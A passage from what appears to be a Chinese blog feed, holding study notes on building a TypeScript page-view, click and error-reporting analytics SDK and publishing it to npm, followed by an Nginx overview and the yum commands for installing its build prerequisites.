<h2 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h2><h3 id="页面访问量"><a href="#页面访问量" class="headerlink" title="页面访问量"></a>页面访问量</h3><p>即PageView，简称PV</p>
<p>用户每次对网站的访问均会被记录，记录时主要监听了history和hash</p>
<p>hash可以使用使用hashchange监听</p>
<p>history只能通过popstate监听，无法通过pushState、replaceState这些API监听，只能重写其函数：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// T：History对象的所有键名</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createHistoryEvent = &lt;T <span class="keyword">extends</span> keyof <span class="title class_">History</span>&gt;<span class="function">(<span class="params"><span class="keyword">type</span>: T</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// origin：History对象中对于传入键名的值</span></span><br><span class="line">  <span class="keyword">const</span> origin = history[<span class="keyword">type</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"><span class="variable language_">this</span>:<span class="built_in">any</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 调用原版函数</span></span><br><span class="line">    <span class="keyword">const</span> res = origin.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建自定义事件（发布订阅模式）</span></span><br><span class="line">    <span class="keyword">const</span> e = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="keyword">type</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dispatchEvent：派发事件</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">dispatchEvent</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// addEventListener：监听事件</span></span><br><span class="line"><span class="comment">// window.addEventListener(&quot;pushState&quot;,console.log)</span></span><br><span class="line"><span class="comment">// removeEventListener：删除事件</span></span><br></pre></td></tr></table></figure>

<p>监听：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 事件捕获器</span></span><br><span class="line"><span class="comment">// mouseEventList：事件列表   target：后台定义的枚举值</span></span><br><span class="line"><span class="keyword">private</span> captureEvents &lt;T&gt;(<span class="attr">mouseEventList</span>:<span class="built_in">string</span>[],<span class="attr">targetKey</span>:<span class="built_in">string</span>,data?:T) &#123;</span><br><span class="line">  mouseEventList.<span class="title function_">forEach</span>(<span class="function"><span class="params">event</span>=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(event,<span class="function">()=&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;监听到了&quot;</span>)</span><br><span class="line">      <span class="comment">// 捕获到时上报</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;event,targetKey,data&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="独立访客"><a href="#独立访客" class="headerlink" title="独立访客"></a>独立访客</h3><p>即Unique Visitor，简称UV，访问网站的一台电脑客户端为一个访客</p>
<p>需要生成用户唯一表示，这个是后台的工作，前台只需要获取并使用接口返回的id即可</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置用户id</span></span><br><span class="line"><span class="keyword">public</span> setUserId &lt;T <span class="keyword">extends</span> <span class="title class_">DefaultOptons</span>[<span class="string">&quot;uuid&quot;</span>]&gt;(<span class="attr">uuid</span>:T) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">uuid</span> = uuid</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置用户自定义参数</span></span><br><span class="line"><span class="keyword">public</span> setExtra &lt;T <span class="keyword">extends</span> <span class="title class_">DefaultOptons</span>[<span class="string">&quot;extra&quot;</span>]&gt;(<span class="attr">extra</span>:T) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">extra</span> = extra</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以使用canvas指纹追踪技术</p>
<h3 id="navigator-sendBeacon"><a href="#navigator-sendBeacon" class="headerlink" title="navigator.sendBeacon"></a>navigator.sendBeacon</h3><p>使用<code>navigator.sendBeacon</code>上报访问记录，即使页面关闭了，也会完成请求，而XMLHTTPRequest不一定</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 上报</span></span><br><span class="line"><span class="keyword">private</span> reportTracker &lt;T&gt;(<span class="attr">data</span>:T) &#123;</span><br><span class="line">  <span class="keyword">const</span> params = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">this</span>.<span class="property">data</span>,data,&#123;<span class="attr">time</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>()&#125;)</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">let</span> headers = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;application/x-www-form-unlencoded&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(params)],headers)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不支持json，所以使用blob，请求类型是ping</span></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">requestUrl</span>,blob)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DOM事件监听"><a href="#DOM事件监听" class="headerlink" title="DOM事件监听"></a>DOM事件监听</h3><p>给需要监听的元素添加一个属性，用来区分是否需要监听</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DOM事件监听</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">targetKeyReport</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">MouseEventList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">ev</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(ev,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> target = e.<span class="property">target</span> <span class="keyword">as</span> <span class="title class_">HTMLElement</span></span><br><span class="line">      <span class="comment">// 如果元素上有这个属性，说明此次操作需要被上报</span></span><br><span class="line">      <span class="keyword">const</span> targetKey = target.<span class="title function_">getAttribute</span>(<span class="string">&quot;target-key&quot;</span>)</span><br><span class="line">      <span class="keyword">if</span>(targetKey) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;<span class="attr">event</span>:ev,targetKey&#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="错误上报"><a href="#错误上报" class="headerlink" title="错误上报"></a>错误上报</h3><p>需要处理error事件和promise的unhandledrejection报错</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">jsError</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">errorEvent</span>()</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">promiseReject</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// error事件错误上报</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">errorEvent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;error&quot;</span>,<span class="function">(<span class="params">event</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;</span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">      <span class="attr">targetKey</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">message</span>: event.<span class="property">message</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// promise错误上报</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">promiseReject</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>,<span class="function">(<span class="params">event</span>)=&gt;</span> &#123;</span><br><span class="line">    event.<span class="property">promise</span>.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span>=&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;</span><br><span class="line">        <span class="attr">event</span>: <span class="string">&quot;promise&quot;</span>,</span><br><span class="line">        <span class="attr">targetKey</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">        <span class="attr">message</span>: error</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="全部代码"><a href="#全部代码" class="headerlink" title="全部代码"></a>全部代码</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">DefaultOptons</span>, <span class="title class_">TrackerConfig</span>, <span class="title class_">Options</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../types/index&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createHistoryEvent &#125; <span class="keyword">from</span> <span class="string">&quot;../utils/pv&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MouseEventList</span>: <span class="built_in">string</span>[] = [<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;dblclick&#x27;</span>, <span class="string">&#x27;contextmenu&#x27;</span>, <span class="string">&#x27;mousedown&#x27;</span>, <span class="string">&#x27;mouseup&#x27;</span>, <span class="string">&#x27;mouseenter&#x27;</span>, <span class="string">&#x27;mouseout&#x27;</span>, <span class="string">&#x27;mouseover&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">Tracker</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="attr">data</span>:<span class="title class_">Options</span></span><br><span class="line">  <span class="comment">// options：配置项</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">options:Options</span>) &#123;</span><br><span class="line">    <span class="comment">// 用户传入的options中的项会覆盖默认同名项</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">data</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">this</span>.<span class="title function_">initDef</span>(),options)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">installTracker</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户不传配置项时的兜底逻辑（设置默认项）</span></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">initDef</span>():<span class="title class_">DefaultOptons</span> &#123;</span><br><span class="line">    <span class="comment">// 用重写的history方法替换原生</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">history</span>[<span class="string">&quot;pushState&quot;</span>] = <span class="title function_">createHistoryEvent</span>(<span class="string">&quot;pushState&quot;</span>)</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">history</span>[<span class="string">&quot;replaceState&quot;</span>] = <span class="title function_">createHistoryEvent</span>(<span class="string">&quot;replaceState&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>&lt;<span class="title class_">DefaultOptons</span>&gt; &#123;</span><br><span class="line">      <span class="attr">sdkVersion</span>: <span class="title class_">TrackerConfig</span>.<span class="property">version</span>,</span><br><span class="line">      <span class="attr">historyTracker</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">hashTracker</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">domTracker</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">jsError</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置用户id</span></span><br><span class="line">  <span class="keyword">public</span> setUserId &lt;T <span class="keyword">extends</span> <span class="title class_">DefaultOptons</span>[<span class="string">&quot;uuid&quot;</span>]&gt;(<span class="attr">uuid</span>:T) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">uuid</span> = uuid</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置用户自定义参数</span></span><br><span class="line">  <span class="keyword">public</span> setExtra &lt;T <span class="keyword">extends</span> <span class="title class_">DefaultOptons</span>[<span class="string">&quot;extra&quot;</span>]&gt;(<span class="attr">extra</span>:T) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">extra</span> = extra</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化监听器的函数</span></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">installTracker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 如果开启了history监听</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">historyTracker</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">captureEvents</span>([<span class="string">&quot;pushState&quot;</span>,<span class="string">&quot;replaceState&quot;</span>,<span class="string">&quot;popstate&quot;</span>],<span class="string">&quot;history-pv&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果开启了hash监听</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">hashTracker</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">captureEvents</span>([<span class="string">&quot;hashchange&quot;</span>],<span class="string">&quot;hash-pv&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果开启了DOM监听</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">domTracker</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">targetKeyReport</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果开启了错误监听</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">jsError</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">jsError</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 手动发起上报</span></span><br><span class="line">  <span class="keyword">public</span> sendTracker &lt;T&gt;(<span class="attr">data</span>:T) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(data)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// DOM事件监听</span></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">targetKeyReport</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">MouseEventList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">ev</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(ev,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> target = e.<span class="property">target</span> <span class="keyword">as</span> <span class="title class_">HTMLElement</span></span><br><span class="line">        <span class="comment">// 如果元素上有这个属性，说明此次操作需要被上报</span></span><br><span class="line">        <span class="keyword">const</span> targetKey = target.<span class="title function_">getAttribute</span>(<span class="string">&quot;target-key&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(targetKey) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;<span class="attr">event</span>:ev,targetKey&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 路由事件监听</span></span><br><span class="line">  <span class="comment">// mouseEventList：事件列表   target：后台定义的枚举值</span></span><br><span class="line">  <span class="keyword">private</span> captureEvents &lt;T&gt;(<span class="attr">mouseEventList</span>:<span class="built_in">string</span>[],<span class="attr">targetKey</span>:<span class="built_in">string</span>,data?:T) &#123;</span><br><span class="line">    mouseEventList.<span class="title function_">forEach</span>(<span class="function"><span class="params">event</span>=&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(event,<span class="function">()=&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;监听到了&quot;</span>)</span><br><span class="line">        <span class="comment">// 捕获到时上报</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;event,targetKey,data&#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 开启错误处理</span></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">jsError</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">errorEvent</span>()</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">promiseReject</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// error事件错误上报</span></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">errorEvent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;error&quot;</span>,<span class="function">(<span class="params">event</span>)=&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;</span><br><span class="line">        <span class="attr">event</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">        <span class="attr">targetKey</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">        <span class="attr">message</span>: event.<span class="property">message</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// promise错误上报</span></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">promiseReject</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>,<span class="function">(<span class="params">event</span>)=&gt;</span> &#123;</span><br><span class="line">      event.<span class="property">promise</span>.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">reportTracker</span>(&#123;</span><br><span class="line">          <span class="attr">event</span>: <span class="string">&quot;promise&quot;</span>,</span><br><span class="line">          <span class="attr">targetKey</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">          <span class="attr">message</span>: error</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向后台上报</span></span><br><span class="line">  <span class="keyword">private</span> reportTracker &lt;T&gt;(<span class="attr">data</span>:T) &#123;</span><br><span class="line">    <span class="keyword">const</span> params = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">this</span>.<span class="property">data</span>,data,&#123;<span class="attr">time</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>()&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> headers = &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;application/x-www-form-unlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(params)],headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不支持json，所以使用blob</span></span><br><span class="line">    navigator.<span class="title function_">sendBeacon</span>(<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">requestUrl</span>,blob)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="发布npm"><a href="#发布npm" class="headerlink" title="发布npm"></a>发布npm</h1><h2 id="发布设置"><a href="#发布设置" class="headerlink" title="发布设置"></a>发布设置</h2><p>package.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tracker&quot;</span><span class="punctuation">,</span>		<span class="comment">// 包名，传到npm时就是这个名字</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span>		<span class="comment">// 版本号</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// import的查找规则：browser+mjs→module→browser+cjs→main</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/index.cjs.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/index.esm.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;browser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rollup -c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span>			<span class="comment">// 搜索关键词</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;dist&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>		<span class="comment">// 要上传的目录，不写就默认上传整个工程目录</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>npm的源一定要是默认源</p>
<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm adduser</span><br></pre></td></tr></table></figure>

<p>依次输入用户名、密码、邮箱，输入正确邮箱验证码后注册完成</p>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm login</span><br></pre></td></tr></table></figure>

<p>依次输入用户名、密码、邮箱，输入正确邮箱验证码后登录完成</p>
<h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>

<p>发布完成后会收到npm的提示邮件</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx概述</title>
    <url>/web/study/Nginx/1.Nginx%E6%A6%82%E8%BF%B0.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>Nginx(engine x)是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务</p>
<p>Nginx的优点：</p>
<ul>
<li>适合高并发、大流量的场景</li>
<li>服务安装简单、配置文件简洁（还支持perl语法）、Bug少</li>
<li>启动容易，并且几乎可以7*24不间断运行，即使运行数个月也不用重新启动，还能在不间断服务的情况下进行软件版本升级</li>
</ul>
<p>Nginx代码完全用C语言从头写成，官方数据测试表明能够支持高达50000个并发连接数的响应</p>
<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>Nginx不仅可以做反向代理，还能用作正向代理来进行上网等功能</p>
<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>局域网中的客户端要访问Internet，则需要通过代理服务器来访问，这种代理服务被称为正向代理（通过正向代理实现上网）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306271554532.png"></p>
<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>代理服务器接受到网络上的连接请求时，它将请求转发给内网上的服务器，并将从服务器上得到的结果返回给网络上请求连接的客户端，此时代理服务器对外就表现为一个服务器，这种代理服务被称为反向代理</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306271637560.png"></p>
<h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><h2 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h2><p>轮询方式是Nginx负载默认的方式，所有请求都按照时间顺序分配到不同的服务上，如果服务Down掉，可以自动剔除</p>
<h2 id="权重"><a href="#权重" class="headerlink" title="权重"></a>权重</h2><p>指定每个服务的权重比例，weight和访问比率成正比，通常用于后端服务机器性能不统一的情况，将性能好的分配高权重来发挥服务器最大性能</p>
<h1 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h1><p>通常，动态资源指后台资源，而静态资源指HTML、JavaScript、CSS、img等文件</p>
<p>一般都需将动态资源和静态资源分开，将静态资源部署在Nginx上</p>
<p>当一个请求来的时候，如果是静态资源的请求，就直接到Nginx配置的静态资源目录下面获取资源；如果是动态资源的请求，Nginx会利用反向代理的原理，把请求转发给后台应用去处理，从而实现动静分离</p>
<p>使用前后端分离，可以很大程度的提升静态资源的访问速度，也可以实现前后端开发并行，能有效地提高开发时间、减少联调时间</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装Nginx</title>
    <url>/web/study/Nginx/2.Linux%E5%AE%89%E8%A3%85Nginx.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="前置软件"><a href="#前置软件" class="headerlink" title="前置软件"></a>前置软件</h1><h3 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h3><p>安装Nginx需要先将官网下载的源码进行编译，编译依赖gcc环境，所以需要安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install gcc-c++</span><br></pre></td></tr></table></figure>

<h2 id="安装PCRE-pcre-devel"><a href="#安装PCRE-pcre-devel" class="headerlink" title="安装PCRE pcre-devel"></a>安装PCRE pcre-devel</h2><p>PCRE(Perl Compatible Regular Expressions) 是一个perl库，包括perl兼容的正则表达式库</p>
<p>Nginx的http模块使用PCRE解析正则表达式，所以需要在Linux上安装PCRE库</p>
<p>pcre-devel是使用PCRE开发的一个二次开发库，Nginx也需要此库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y pcre pcre-devel</span><br></pre></td></tr></table></figure>

<h2 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h2><p>zlib库提供了很多种压缩和解压缩的方式，Nginx使用zlib对http包的内容进行gzip，所以需要在Centos上安装zlib库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y zlib zlib-devel</span><br></pre></td></tr></table></figure>

